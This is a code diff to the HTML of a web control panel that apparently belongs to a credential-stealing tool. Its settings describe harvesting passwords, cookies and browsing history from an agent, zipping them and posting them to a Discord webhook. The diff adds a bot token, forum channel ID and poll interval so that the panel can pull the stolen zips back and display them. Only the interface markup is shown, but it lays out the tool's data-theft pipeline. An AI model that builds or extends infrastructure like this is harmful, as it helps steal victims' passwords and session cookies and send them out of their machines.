@@ -38,7 +38,6 @@
           <button id="scan-vpn-btn" class="btn">Scan VPN</button>
           <button id="ping-btn" class="btn">Ping</button>
           <button id="export-btn" class="btn" disabled>Export ZIP</button>
-          <button id="discord-upload-btn" class="btn btn-discord" disabled title="Zip logs and post to Discord webhook">Send to Discord</button>
         </div>
       </section>
 
@@ -48,7 +47,7 @@
         <div class="actions">
           <button id="refresh-btn" class="btn">Refresh</button>
           <button id="export-all-btn" class="btn" disabled>Export All ZIP</button>
-          <button id="discord-upload-all-btn" class="btn btn-discord" disabled title="Zip all harvests and post to Discord webhook">Send All to Discord</button>
+          <button id="discord-poll-btn" class="btn btn-discord" title="Poll Discord forum for new log zips (bot token)">Poll Discord</button>
           <button id="clear-all-btn" class="btn btn-danger">Clear All</button>
         </div>
       </section>
@@ -147,21 +146,11 @@
           <div style="height:1px;background:var(--border);margin:10px 0"></div>
           <div class="setting-row">
             <div class="setting-info">
-              <span class="setting-name">Discord webhook upload</span>
-              <span class="setting-desc">After each harvest, zip passwords/cookies/history/… and post to a Discord forum channel via webhook</span>
+              <span class="setting-name">Discord log pipeline</span>
+              <span class="setting-desc">When on: harvest zips go to Discord only (webhook). This server polls the forum with a bot token, unzips, and displays. No durable harvest store from the agent path.</span>
             </div>
             <label class="toggle-label">
               <input type="checkbox" id="discord-upload-toggle" />
-              <span class="toggle-track"><span class="toggle-thumb"></span></span>
-            </label>
-          </div>
-          <div class="setting-row setting-sub" id="discord-forum-row">
-            <div class="setting-info">
-              <span class="setting-name">Forum channel mode</span>
-              <span class="setting-desc">Create a new forum post per upload (sends thread_name). Turn off for normal text channels.</span>
-            </div>
-            <label class="toggle-label">
-              <input type="checkbox" id="discord-forum-toggle" checked />
               <span class="toggle-track"><span class="toggle-thumb"></span></span>
             </label>
           </div>
@@ -172,17 +161,41 @@
             </div>
             <input type="text" id="discord-thread-prefix" class="input" style="width:140px;flex:none" maxlength="80" value="Stuart" />
           </div>
+          <div class="setting-row setting-sub" id="discord-channel-row">
+            <div class="setting-info">
+              <span class="setting-name">Forum channel ID</span>
+              <span class="setting-desc">Discord forum channel snowflake (Developer Mode → Copy Channel ID). Bot must see this channel.</span>
+            </div>
+            <input type="text" id="discord-forum-channel-id" class="input" style="width:220px;flex:none;font-family:ui-monospace,monospace;font-size:12px" placeholder="123456789012345678" autocomplete="off" />
+          </div>
+          <div class="setting-row setting-sub" id="discord-poll-interval-row">
+            <div class="setting-info">
+              <span class="setting-name">Poll interval (seconds)</span>
+              <span class="setting-desc">How often the bot checks the forum for new zip attachments (5–300)</span>
+            </div>
+            <input type="number" id="discord-poll-interval" class="input" style="width:90px;flex:none" min="5" max="300" value="15" />
+          </div>
           <div class="setting-row setting-sub" id="discord-webhook-row" style="flex-direction:column;align-items:stretch;gap:8px">
             <div class="setting-info">
               <span class="setting-name">Discord webhook URL</span>
-              <span class="setting-desc">Channel settings → Integrations → Webhooks. For a forum channel, create the webhook on that forum.</span>
+              <span class="setting-desc">Create on the <strong>forum</strong> channel: Integrations → Webhooks. Used only to upload log zips.</span>
             </div>
             <input type="password" id="discord-webhook-url" class="input" style="width:100%;font-family:ui-monospace,monospace;font-size:12px" placeholder="https://discord.com/api/webhooks/…/…" autocomplete="off" spellcheck="false" />
-            <div class="actions" style="justify-content:flex-end">
-              <button type="button" id="discord-webhook-show-btn" class="btn btn-sm">Show</button>
-              <button type="button" id="discord-webhook-test-btn" class="btn btn-sm">Test webhook</button>
-              <button type="button" id="discord-webhook-save-btn" class="btn btn-green btn-sm">Save webhook</button>
+          </div>
+          <div class="setting-row setting-sub" id="discord-bot-row" style="flex-direction:column;align-items:stretch;gap:8px">
+            <div class="setting-info">
+              <span class="setting-name">Discord bot token</span>
+              <span class="setting-desc">Bot used to poll the forum, download zips, and import into the panel. Invite with View Channel + Read Message History.</span>
             </div>
+            <input type="password" id="discord-bot-token" class="input" style="width:100%;font-family:ui-monospace,monospace;font-size:12px" placeholder="Bot token" autocomplete="off" spellcheck="false" />
+            <div class="actions" style="justify-content:flex-end;flex-wrap:wrap;gap:6px">
+              <button type="button" id="discord-webhook-show-btn" class="btn btn-sm">Show secrets</button>
+              <button type="button" id="discord-webhook-test-btn" class="btn btn-sm">Test webhook</button>
+              <button type="button" id="discord-bot-test-btn" class="btn btn-sm">Test bot</button>
+              <button type="button" id="discord-poll-now-btn" class="btn btn-sm">Poll now</button>
+              <button type="button" id="discord-webhook-save-btn" class="btn btn-green btn-sm">Save Discord settings</button>
+            </div>
+            <div id="discord-poll-status" class="settings-status" style="margin-top:0"></div>
           </div>
         </div>
         <span id="settings-status" class="settings-status"></span>
